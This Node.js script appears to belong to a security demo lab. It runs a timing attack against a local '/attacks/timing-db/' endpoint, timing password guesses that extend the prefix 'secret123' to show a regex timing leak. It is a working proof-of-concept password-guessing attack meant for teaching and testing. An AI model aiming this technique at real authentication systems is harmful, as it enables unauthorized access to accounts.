#!/usr/bin/env node

const http = require("http");

const BASE_URL = "http://localhost:3000";

const makeRequest = (password) => {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify({ password });

    const options = {
      hostname: "localhost",
      port: 3000,
      path: "/attacks/timing-db/",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": Buffer.byteLength(data),
      },
    };

    const req = http.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => {
        body += chunk;
      });
      res.on("end", () => {
        try {
          const parsed = JSON.parse(body);
          resolve(parsed);
        } catch (e) {
          resolve({ error: body });
        }
      });
    });

    req.on("error", reject);
    req.write(data);
    req.end();
  });
};

const testTimingAttack = async () => {
  console.log("Testing DB Regex Timing Attack");
  console.log("=".repeat(50));

  const testPasswords = [
    "s", // 1 char - should be fast
    "se", // 2 chars - should be medium
    "sec", // 3 chars - should be medium
    "secr", // 4 chars - should be medium
    "secre", // 5 chars - should be medium
    "secret", // 6 chars - should be medium
    "secret1", // 7 chars - should be medium
    "secret12", // 8 chars - should be medium
    "secret123", // 9 chars - should be slowest (full match)
    "x", // 1 char - should be fast (no match)
    "admin", // 5 chars - should be medium (no match)
    "password", // 8 chars - should be medium (no match)
  ];

  const results = [];

  for (const password of testPasswords) {
    console.log(`\nTesting: "${password}"`);

    const times = [];

    // Make 3 requests to get average timing
    for (let i = 0; i < 3; i++) {
      try {
        const startTime = Date.now();
        const result = await makeRequest(password);
        const endTime = Date.now();
        const responseTime = endTime - startTime;

        times.push(responseTime);

        console.log(
          `   Request ${i + 1}: ${responseTime}ms (DB: ${
            result.milliseconds
          }ms)`
        );

        // Small delay between requests
        await new Promise((resolve) => setTimeout(resolve, 100));
      } catch (error) {
        console.log(`   ❌ Error: ${error.message}`);
      }
    }

    if (times.length > 0) {
      const avgTime = times.reduce((a, b) => a + b, 0) / times.length;
      const minTime = Math.min(...times);
      const maxTime = Math.max(...times);

      results.push({
        password,
        avgTime: avgTime.toFixed(2),
        minTime,
        maxTime,
        found: password === "secret123",
      });

      console.log(`   Average: ${avgTime.toFixed(2)}ms`);
    }
  }

  // Show results summary
  console.log("\n" + "=".repeat(50));
  console.log("TIMING ATTACK RESULTS:");
  console.log("=".repeat(50));

  results.forEach((result) => {
    const status = result.found ? "MATCH" : "NO MATCH";
    console.log(
      `${status} "${result.password}" (${result.password.length} chars): ${result.avgTime}ms`
    );
  });

  // Find timing differences
  const matchResult = results.find((r) => r.found);
  const noMatchResults = results.filter((r) => !r.found);

  if (matchResult && noMatchResults.length > 0) {
    const avgNoMatch =
      noMatchResults.reduce((sum, r) => sum + parseFloat(r.avgTime), 0) /
      noMatchResults.length;
    const timingRatio = parseFloat(matchResult.avgTime) / avgNoMatch;

    console.log(`\nTIMING ANALYSIS:`);
    console.log(
      `   Full match (${matchResult.password}): ${matchResult.avgTime}ms`
    );
    console.log(`   Average no-match: ${avgNoMatch.toFixed(2)}ms`);
    console.log(`   Timing ratio: ${timingRatio.toFixed(2)}x`);

    if (timingRatio > 1.5) {
      console.log(`   VULNERABLE: Clear timing difference detected!`);
    } else {
      console.log(`   SECURE: No significant timing difference`);
    }
  }

  console.log("\nThis demonstrates how attackers can use regex timing");
  console.log("   differences to guess passwords character by character.");
};

// Run the test
testTimingAttack().catch(console.error);
